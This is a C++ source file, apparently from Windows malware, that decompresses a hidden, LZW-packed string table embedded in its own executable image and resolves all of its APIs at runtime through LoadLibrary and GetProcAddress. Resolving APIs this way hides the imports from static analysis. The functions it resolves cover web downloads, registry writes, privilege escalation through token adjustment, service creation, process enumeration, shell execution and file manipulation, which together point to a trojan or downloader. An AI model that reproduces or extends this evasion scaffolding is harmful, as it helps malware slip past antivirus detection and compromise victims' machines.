#include "stdafx.h"
#include "MyFunc.h"
#include "Lzw.h"

CMyFunc::CMyFunc()
{
	hModule_Kernel32 = NULL;
	hModule_Psapi = NULL;
	hModule_Shell32 = NULL;
	hModule_MSVCRT = NULL;
	hModule_User32 = NULL;
	hModule_ole32 = NULL;
	hModule_ADVAPI32 = NULL;
	hModule_wininet = NULL;
	hModule_Shlwapi = NULL;
	HMODULE hModule_Winmm = NULL;
	hModule_Ole32 = NULL;

	pModuleString = NULL;
	nModuleStringLen = 0;

	pZipString = NULL;
	nZipStringLen = 0;;
}

CMyFunc::~CMyFunc()
{
	if(hModule_Kernel32 != NULL)
	{
		FreeLibrary(hModule_Kernel32);
	}
	if(hModule_Psapi != NULL)
	{
		FreeLibrary(hModule_Psapi);
	}
	if(hModule_Shell32 != NULL)
	{
		FreeLibrary(hModule_Shell32);
	}
	if(hModule_MSVCRT != NULL)
	{
		FreeLibrary(hModule_MSVCRT);
	}
	if(hModule_User32 != NULL)
	{
		FreeLibrary(hModule_User32);
	}
	if(hModule_ole32 != NULL)
	{
		FreeLibrary(hModule_ole32);
	}
	if(hModule_ADVAPI32 != NULL)
	{
		FreeLibrary(hModule_ADVAPI32);
	}
	if(hModule_wininet != NULL)
	{
		FreeLibrary(hModule_wininet);
	}
	if(hModule_Shlwapi != NULL)
	{
		FreeLibrary(hModule_Shlwapi);
	}

	if(pModuleString != NULL)
	{
		delete [] pModuleString;
	}
	if(pZipString != NULL)
	{
		delete [] pZipString;
	}
}

inline int CMyFunc::GetMySprintf(int nValue, char* pOutStr)
{
	for(int i = 4; i >= 0; i--)
	{
		pOutStr[i] = 0x30 + nValue % 10;
		nValue = nValue / 10;
	}
	return i;
}

inline BOOL CMyFunc::DoMyMemCmp(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		if(pSrc[i] != pDes[i])
		{
			return FALSE;
		}
	}
	return TRUE;
}

inline void  CMyFunc::DoMyMemCpy(char* pDes, char* pSrc, int len)
{
	for(int i = 0; i < len; i++)
	{
		pDes[i] = pSrc[i];
	}
}

inline void CMyFunc::GetMyString(DWORD nIndex, char* pOutString, char* pInString, DWORD nInStringLen)
{
	//查看
	if(pInString == NULL || nInStringLen == 0 || nIndex < 10001 || nIndex > 19999)
	{
		return;
	}
	
	char m_FindStr[256] = {0};
	m_FindStr[0] = 'P';
	m_FindStr[1] = 'S';
	m_FindStr[2] = '_';
	GetMySprintf(nIndex, m_FindStr + 3);
	m_FindStr[8] = '=';
	
	for(DWORD i = 0; i < nInStringLen; i++)
	{
		if(DoMyMemCmp(&pInString[i], m_FindStr, 9))
		{
			//找到开始
			char* pStart = &pInString[i] + 9;
			for(i = 0; i < nInStringLen - i - 9; i++)
			{
				if(pStart[i] == '\r')
				{
					DoMyMemCpy(pOutString, pStart, i);
					pOutString[i] = 0;
					return;
				}
			}
		}
	}
}

BOOL CMyFunc::LoadMyData(BYTE* pModuel)
{
	if(pModuleString != NULL)
	{
		return TRUE;
	}

	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//取字串资源偏移量
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	BYTE* pTmpData = pModuel;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pTmpData[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pTmpData[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return FALSE;
	}

	//保存压缩前的数据
	nZipStringLen = pSaveFileInfo->m_StringLen;
	pZipString = new BYTE[nZipStringLen + 1];
	DoMyMemCpy((char*) pZipString, ((char*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO), nZipStringLen);
	
//	_asm int 3;

	BYTE* pTmpStr = NULL;

	//开辟字串存储缓冲
	FCLzw lzw;
	lzw.PcUnZip(((BYTE*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO), &pTmpStr, &nModuleStringLen);
	pModuleString = (char*) pTmpStr;

	
	//开始赋值函数指针
	char m_MyString[512] = {0};

//ole32.dll
	GetMyString(10001, m_MyString, pModuleString, nModuleStringLen);
	hModule_ole32 = LoadLibrary(m_MyString);

	//CoCreateGuid
	GetMyString(10002, m_MyString, pModuleString, nModuleStringLen);
	CoCreateGuid = (MyCoCreateGuid) GetProcAddress(hModule_ole32, m_MyString);
	
//wininet.dll
	GetMyString(10005, m_MyString, pModuleString, nModuleStringLen);
	hModule_wininet = LoadLibrary(m_MyString);

	//InternetOpenA
	GetMyString(10006, m_MyString, pModuleString, nModuleStringLen);
	InternetOpen = (MyInternetOpenA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetOpenUrlA
	GetMyString(10007, m_MyString, pModuleString, nModuleStringLen);
	InternetOpenUrl = (MyInternetOpenUrlA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetCloseHandle
	GetMyString(10008, m_MyString, pModuleString, nModuleStringLen);	
	InternetCloseHandle = (MyInternetCloseHandle) GetProcAddress(hModule_wininet, m_MyString);

	//HttpQueryInfoA
	GetMyString(10009, m_MyString, pModuleString, nModuleStringLen);	
	HttpQueryInfo = (MyHttpQueryInfoA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetReadFile
	GetMyString(10010, m_MyString, pModuleString, nModuleStringLen);	
	InternetReadFile = (MyInternetReadFile) GetProcAddress(hModule_wininet, m_MyString);

//ADVAPI32.dll
	GetMyString(10016, m_MyString, pModuleString, nModuleStringLen);
	hModule_ADVAPI32 = LoadLibrary(m_MyString);

	//RegCloseKey
	GetMyString(10018, m_MyString, pModuleString, nModuleStringLen);
	RegCloseKey = (MyRegCloseKey) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegOpenKeyExA
	GetMyString(10019, m_MyString, pModuleString, nModuleStringLen);
	RegOpenKeyEx = (MyRegOpenKeyExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegCreateKeyExA
	GetMyString(10020, m_MyString, pModuleString, nModuleStringLen);
	RegCreateKeyEx = (MyRegCreateKeyExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegSetValueExA
	GetMyString(10021, m_MyString, pModuleString, nModuleStringLen);
	RegSetValueEx = (MyRegSetValueExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//AdjustTokenPrivileges
	GetMyString(10023, m_MyString, pModuleString, nModuleStringLen);
	AdjustTokenPrivileges = (MyAdjustTokenPrivileges) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//LookupPrivilegeValueA
	GetMyString(10024, m_MyString, pModuleString, nModuleStringLen);
	LookupPrivilegeValue = (MyLookupPrivilegeValueA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenProcessToken
	GetMyString(10025, m_MyString, pModuleString, nModuleStringLen);
	OpenProcessToken = (MyOpenProcessToken) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//StartServiceA
	GetMyString(10026, m_MyString, pModuleString, nModuleStringLen);
	StartService = (MyStartServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//CloseServiceHandle
	GetMyString(10027, m_MyString, pModuleString, nModuleStringLen);
	CloseServiceHandle = (MyCloseServiceHandle) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenServiceA
	GetMyString(10028, m_MyString, pModuleString, nModuleStringLen);
	OpenService = (MyOpenServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenSCManagerA
	GetMyString(10029, m_MyString, pModuleString, nModuleStringLen);
	OpenSCManager = (MyOpenSCManagerA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//CreateServiceA
	GetMyString(10030, m_MyString, pModuleString, nModuleStringLen);
	CreateService = (MyCreateServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegisterServiceCtrlHandlerA
	GetMyString(10032, m_MyString, pModuleString, nModuleStringLen);
	RegisterServiceCtrlHandler = (MyRegisterServiceCtrlHandlerA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//SetServiceStatus
	GetMyString(10033, m_MyString, pModuleString, nModuleStringLen);
	SetServiceStatus = (MySetServiceStatus) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//ChangeServiceConfig2A
	GetMyString(10313, m_MyString, pModuleString, nModuleStringLen);
	ChangeServiceConfig2 = (MyChangeServiceConfig2A) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//QueryServiceConfig2A
	GetMyString(10314, m_MyString, pModuleString, nModuleStringLen);
	QueryServiceConfig2 = (MyQueryServiceConfig2A) GetProcAddress(hModule_ADVAPI32, m_MyString);

//Shell32.dll
	GetMyString(10034, m_MyString, pModuleString, nModuleStringLen);
	hModule_Shell32 = LoadLibrary(m_MyString);

	//ShellExecuteA
	GetMyString(10036, m_MyString, pModuleString, nModuleStringLen);
	ShellExecute = (MyShellExecuteA) GetProcAddress(hModule_Shell32, m_MyString);

//User32.dll
	GetMyString(10037, m_MyString, pModuleString, nModuleStringLen);
	hModule_User32 = LoadLibrary(m_MyString);

	//PostThreadMessageA
	GetMyString(10038, m_MyString, pModuleString, nModuleStringLen);
	PostThreadMessage = (MyPostThreadMessageA) GetProcAddress(hModule_User32, m_MyString);

	//CharLowerA
	GetMyString(10040, m_MyString, pModuleString, nModuleStringLen);
	CharLower = (MyCharLowerA) GetProcAddress(hModule_User32, m_MyString);

	//GetMessageA
	GetMyString(10041, m_MyString, pModuleString, nModuleStringLen);
	GetMessage = (MyGetMessageA) GetProcAddress(hModule_User32, m_MyString);

//Kernel32.dll
	GetMyString(10053, m_MyString, pModuleString, nModuleStringLen);
	hModule_Kernel32 = LoadLibrary(m_MyString);

	//GetEnvironmentVariableA
	GetMyString(10196, m_MyString, pModuleString, nModuleStringLen);
	GetEnvironmentVariable = (MyGetEnvironmentVariableA) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateThread
	GetMyString(10069, m_MyString, pModuleString, nModuleStringLen);
	CreateThread = (MyCreateThread) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetSystemDirectoryA
	GetMyString(10070, m_MyString, pModuleString, nModuleStringLen);
	GetSystemDirectory = (MyGetSystemDirectoryA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentProcess
	GetMyString(10071, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentProcess = (MyGetCurrentProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenProcess
	GetMyString(10072, m_MyString, pModuleString, nModuleStringLen);
	OpenProcess = (MyOpenProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//Sleep
	GetMyString(10075, m_MyString, pModuleString, nModuleStringLen);
	Sleep = (MySleep) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateFileA
	GetMyString(10076, m_MyString, pModuleString, nModuleStringLen);
	CreateFile = (MyCreateFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//WriteFile
	GetMyString(10078, m_MyString, pModuleString, nModuleStringLen);
	WriteFile = (MyWriteFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//CloseHandle
	GetMyString(10082, m_MyString, pModuleString, nModuleStringLen);
	CloseHandle = (MyCloseHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//DeleteFileA
	GetMyString(10077, m_MyString, pModuleString, nModuleStringLen);
	DeleteFile = (MyDeleteFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//ReadFile
	GetMyString(10079, m_MyString, pModuleString, nModuleStringLen);
	ReadFile = (MyReadFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//MoveFileA
	GetMyString(10110, m_MyString, pModuleString, nModuleStringLen);
	MoveFile = (MyMoveFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetModuleFileNameA
	GetMyString(10083, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileName = (MyGetModuleFileNameA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentThreadId
	GetMyString(10086, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentThreadId = (MyGetCurrentThreadId) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetFileSize
	GetMyString(10087, m_MyString, pModuleString, nModuleStringLen);
	GetFileSize = (MyGetFileSize) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetTempPathA
	GetMyString(10088, m_MyString, pModuleString, nModuleStringLen);
	GetTempPath = (MyGetTempPathA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetFileAttributesExA
	GetMyString(10116, m_MyString, pModuleString, nModuleStringLen);
	GetFileAttributesEx = (MyGetFileAttributesExA) GetProcAddress(hModule_Kernel32, m_MyString);

	//CopyFileA
	GetMyString(10080, m_MyString, pModuleString, nModuleStringLen);
	CopyFile = (MyCopyFileA) GetProcAddress(hModule_Kernel32, m_MyString);

//Psapi.dll
	GetMyString(10089, m_MyString, pModuleString, nModuleStringLen);
	hModule_Psapi = LoadLibrary(m_MyString);

	//GetModuleFileNameExA
	GetMyString(10090, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileNameEx = (MyGetModuleFileNameExA) GetProcAddress(hModule_Psapi, m_MyString);

	//EnumProcesses
	GetMyString(10091, m_MyString, pModuleString, nModuleStringLen);
	EnumProcesses = (MyEnumProcesses) GetProcAddress(hModule_Psapi, m_MyString);

//MSVCRT.dll
	GetMyString(10104, m_MyString, pModuleString, nModuleStringLen);
	hModule_MSVCRT = LoadLibrary(m_MyString);

	//sprintf
	GetMyString(10105, m_MyString, pModuleString, nModuleStringLen);
	sprintf = (Mysprintf) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcpy
	GetMyString(10107, m_MyString, pModuleString, nModuleStringLen);
	memcpy = (Mymemcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memset
	GetMyString(10103, m_MyString, pModuleString, nModuleStringLen);
	memset = (Mymemset) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strstr
	GetMyString(10092, m_MyString, pModuleString, nModuleStringLen);
	strstr = (Mystrstr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strchr
	GetMyString(10093, m_MyString, pModuleString, nModuleStringLen);
	strchr = (Mystrchr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcat
	GetMyString(10094, m_MyString, pModuleString, nModuleStringLen);
	strcat = (Mystrcat) GetProcAddress(hModule_MSVCRT, m_MyString);

	//atoi
	GetMyString(10095, m_MyString, pModuleString, nModuleStringLen);
	atoi = (Myatoi) GetProcAddress(hModule_MSVCRT, m_MyString);

	//srand
	GetMyString(10096, m_MyString, pModuleString, nModuleStringLen);
	srand = (Mysrand) GetProcAddress(hModule_MSVCRT, m_MyString);

	//rand
	GetMyString(10097, m_MyString, pModuleString, nModuleStringLen);
	rand = (Myrand) GetProcAddress(hModule_MSVCRT, m_MyString);

	//time
	GetMyString(10098, m_MyString, pModuleString, nModuleStringLen);
	time = (Mytime) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strrchr
	GetMyString(10099, m_MyString, pModuleString, nModuleStringLen);
	strrchr = (Mystrrchr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strlen
	GetMyString(10100, m_MyString, pModuleString, nModuleStringLen);
	strlen = (Mystrlen) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcpy
	GetMyString(10101, m_MyString, pModuleString, nModuleStringLen);
	strcpy = (Mystrcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcmp
	GetMyString(10102, m_MyString, pModuleString, nModuleStringLen);
	strcmp = (Mystrcmp) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcmp
	GetMyString(10106, m_MyString, pModuleString, nModuleStringLen);
	memcmp = (Mymemcmp) GetProcAddress(hModule_MSVCRT, m_MyString);

	return TRUE;
}
